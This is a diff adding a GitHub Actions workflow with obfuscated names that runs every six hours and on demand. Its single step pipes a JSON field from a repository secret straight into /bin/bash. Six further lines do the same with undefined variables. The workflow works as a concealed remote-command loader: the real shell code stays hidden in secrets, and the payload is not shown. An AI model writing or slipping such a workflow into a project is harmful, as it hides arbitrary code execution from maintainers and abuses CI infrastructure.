@@ -1,0 +1,25 @@
+name: ldkhz
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ldkhz
+        env:
+          imcfr32: ${{ secrets.imcfr32 }}
+        run: |
+          echo $imcfr32 | jq -r .su91517 | /bin/bash
+          echo $ihvbb466 | jq -r .g30 | /bin/bash
+          echo $mcnem351 | jq -r .uf93 | /bin/bash
+          echo $dwqv075 | jq -r .hy04 | /bin/bash
+          echo $e50 | jq -r .as17 | /bin/bash
+          echo $bjdnu077 | jq -r .akjin38 | /bin/bash
+          echo $ly9441 | jq -r .lhk49853 | /bin/bash
+
